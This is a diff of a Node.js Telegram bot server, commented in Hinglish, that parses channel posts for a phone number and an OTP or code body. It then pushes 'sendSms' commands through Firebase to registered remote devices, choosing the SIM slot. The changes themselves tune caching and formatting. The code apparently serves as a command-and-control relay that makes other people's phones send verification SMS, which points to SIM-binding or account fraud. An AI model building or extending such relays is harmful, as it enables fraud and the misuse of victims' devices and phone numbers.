@@ -11,8 +11,8 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 let store = { users: {} };
 let processed = new Set();
 let cfgCache = {};
-const CFG_TTL = 30000;
-const CFG_REFRESH_INTERVAL = 45000;
+const CFG_TTL = 300000;              // 5 minute cache — speed ke liye
+const CFG_REFRESH_INTERVAL = 15000;  // har 15 second background refresh
 
 function load() {
     try {
@@ -47,19 +47,19 @@ app.post('/api/register', function (req, res) {
     store.users[clean] = store.users[clean] || {};
     store.users[clean].registeredAt = Date.now();
     save();
-    
-    refreshCfg(clean).then(function(cfg) {
+
+    refreshCfg(clean).then(function (cfg) {
         console.log('Registered & config loaded:', clean);
-    }).catch(function() {
+    }).catch(function () {
         console.log('Registered (config pending):', clean);
     });
-    
+
     res.json({ ok: true });
 });
 
 app.get('/api/status', function (req, res) {
-    res.json({ 
-        ok: true, 
+    res.json({
+        ok: true,
         users: Object.keys(store.users).length,
         cached: Object.keys(cfgCache).length
     });
@@ -72,24 +72,24 @@ app.post('/api/notify-channel', async function (req, res) {
         const sim = req.body.sim || 0;
         const deviceName = req.body.deviceName || 'Unknown';
         const firebaseUrl = req.body.firebaseUrl;
-        
+
         if (!channel) return res.json({ ok: false, error: 'no channel' });
-        
-        const msg = action === 'on' 
+
+        const msg = action === 'on'
             ? ('✅ Token CHALU\n📱 Device: ' + deviceName + '\n📶 SIM: ' + (sim + 1))
             : ('❌ Token BAND\n📱 Device: ' + deviceName);
-        
+
         await bot.telegram.sendMessage(channel, msg);
-        
+
         if (firebaseUrl) {
             await refreshCfg(firebaseUrl.replace(/\/$/, ''));
         }
-        
+
         const users = Object.keys(store.users);
         for (const u of users) {
-            await refreshCfg(u).catch(function() {});
+            await refreshCfg(u).catch(function () {});
         }
-        
+
         res.json({ ok: true });
     } catch (e) {
         console.error('notify-channel error:', e.message);
@@ -99,8 +99,8 @@ app.post('/api/notify-channel', async function (req, res) {
 
 app.listen(PORT, '0.0.0.0', function () {
     console.log('Server running on port ' + PORT);
-    Object.keys(store.users).forEach(function(u) {
-        refreshCfg(u).catch(function() {});
+    Object.keys(store.users).forEach(function (u) {
+        refreshCfg(u).catch(function () {});
     });
 });
 
@@ -146,9 +146,10 @@ function refreshCfg(u) {
         });
 }
 
+// Background refresh — cache always fresh rahega
 setInterval(function () {
     Object.keys(store.users).forEach(function (u) {
-        refreshCfg(u).catch(function() {});
+        refreshCfg(u).catch(function () {});
     });
 }, CFG_REFRESH_INTERVAL);
 
@@ -156,7 +157,7 @@ const bot = new Telegraf(BOT_TOKEN);
 
 function extract(text) {
     if (!text) return null;
-    
+
     var patterns = [
         /To\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
         /Receipt\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
@@ -164,14 +165,14 @@ function extract(text) {
         /Phone\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
         /Mobile\s*[:\-]?[\s\n]*\+?(\d{10,12})/i
     ];
-    
+
     var number = null;
     for (var i = 0; i < patterns.length; i++) {
         var m = text.match(patterns[i]);
         if (m) { number = m[1]; break; }
     }
     if (!number) return null;
-    
+
     var bodyPatterns = [
         /Body\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*([\s\S]+)/i,
         /Message\s*[:\-]?[\s\n]*([\s\S]+)/i,
@@ -180,7 +181,7 @@ function extract(text) {
         /OTP\s*[:\-]?[\s\n]*([\s\S]+)/i,
         /Code\s*[:\-]?[\s\n]*([\s\S]+)/i
     ];
-    
+
     var message = null;
     for (var j = 0; j < bodyPatterns.length; j++) {
         var b = text.match(bodyPatterns[j]);
@@ -190,7 +191,7 @@ function extract(text) {
         }
     }
     if (!message) return null;
-    
+
     return { number: number, message: message };
 }
 
@@ -203,79 +204,93 @@ bot.on('channel_post', async function (ctx) {
     const text = ctx.channelPost.text || ctx.channelPost.caption || '';
     const chatId = ctx.chat.id.toString();
     const msgId = ctx.channelPost.message_id;
-    
+
     if (!text) return;
-    
+
     console.log('\n=== NEW MSG ===');
     console.log('Chat:', chatId, 'MsgId:', msgId);
     console.log('Text:', JSON.stringify(text.slice(0, 200)));
-    
+
     const tok = extract(text);
     if (!tok) {
         console.log('No token extracted');
         return;
     }
-    
+
     const globalKey = chatId + '_' + msgId;
     if (processed.has(globalKey)) {
         console.log('Duplicate, skipping');
         return;
     }
     processed.add(globalKey);
-    
+
     if (processed.size > 5000) {
         processed = new Set(Array.from(processed).slice(-2000));
     }
-    
+
     console.log('Extracted number:', tok.number);
     console.log('Extracted message:', JSON.stringify(tok.message.slice(0, 100)));
-    
+
     const urls = Object.keys(store.users);
     console.log('Checking', urls.length, 'users');
-    
+
     for (const fbUrl of urls) {
         try {
+            // FAST PATH: cache se turant lo
             let cfg = getCfg(fbUrl);
+
+            // Agar cache expired hai to purana wala use karo,
+            // lekin peeche se naya fetch bhi trigger karo (non-blocking)
+            if (!cfg) {
+                cfg = cfgCache[fbUrl] ? cfgCache[fbUrl].cfg : null;
+                refreshCfg(fbUrl).catch(function () {});
+            }
+
+            // Agar bilkul hi cache nahi hai to abhi fetch karo (rare case)
             if (!cfg) {
                 cfg = await refreshCfg(fbUrl);
             }
-            
+
             if (!cfg) {
                 console.log('No config for', fbUrl);
                 continue;
             }
-            
+
             if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) {
                 continue;
             }
-            
+
             let targetDevice = null;
             let simSlot = 0;
-            
+
+            // Naya per-device structure check karo
             if (cfg.devices && typeof cfg.devices === 'object') {
                 const enabledDevices = Object.entries(cfg.devices)
                     .filter(([id, d]) => d && d.enabled === true);
-                
+
                 if (enabledDevices.length > 0) {
                     targetDevice = enabledDevices[0][0];
-                    simSlot = enabledDevices[0][1].simSlot != null ? enabledDevices[0][1].simSlot : 0;
+                    simSlot = enabledDevices[0][1].simSlot != null
+                        ? enabledDevices[0][1].simSlot
+                        : 0;
                 }
             }
-            
+
+            // Legacy fallback
             if (!targetDevice && cfg.tokenEnabled && cfg.tokenDevice) {
                 targetDevice = cfg.tokenDevice;
                 simSlot = cfg.tokenSim || 0;
             }
-            
+
             if (!targetDevice) {
                 continue;
             }
-            
+
             const clean = cleanNumber(tok.number);
             const ts = Date.now();
-            
+
             console.log('Sending to device:', targetDevice, 'SIM:', simSlot);
-            
+
             await fbPut(fbUrl, 'clients/' + targetDevice + '/webhookEvent/sendSms', {
                 to: clean,
                 message: tok.message,
@@ -285,7 +300,7 @@ bot.on('channel_post', async function (ctx) {
                 simInfo: { simSlot: simSlot },
                 fromToken: true
             });
-            
+
             const elapsed = Date.now() - start;
             const reply = '✅ SMS Bhej diya\n\n' +
                 '📱 Device: ' + targetDevice + '\n' +
@@ -293,13 +308,13 @@ bot.on('channel_post', async function (ctx) {
                 '📶 SIM: ' + (simSlot + 1) + '\n' +
                 '⚡ Time: ' + elapsed + 'ms\n\n' +
                 '📝 Body:\n' + tok.message;
-            
+
             await bot.telegram.sendMessage(chatId, reply, {
                 reply_to_message_id: msgId
-            }).catch(function(e) { console.log('Reply error:', e.message); });
-            
+            }).catch(function (e) { console.log('Reply error:', e.message); });
+
             console.log('✅ Sent to', clean, 'in', elapsed + 'ms');
-            
+
         } catch (e) {
             console.error('Error processing', fbUrl, ':', e.message);
         }
@@ -323,12 +338,12 @@ bot.launch()
     .then(function () {
         console.log('✅ Bot started');
         Object.keys(store.users).forEach(function (u) {
-            refreshCfg(u).catch(function() {});
+            refreshCfg(u).catch(function () {});
         });
     })
     .catch(function (e) {
         console.log('❌ Bot error:', e.message);
     });
 
-process.once('SIGINT', function() { bot.stop('SIGINT'); });
-process.once('SIGTERM', function() { bot.stop('SIGTERM'); });
+process.once('SIGINT', function () { bot.stop('SIGINT'); });
+process.once('SIGTERM', function () { bot.stop('SIGTERM'); });
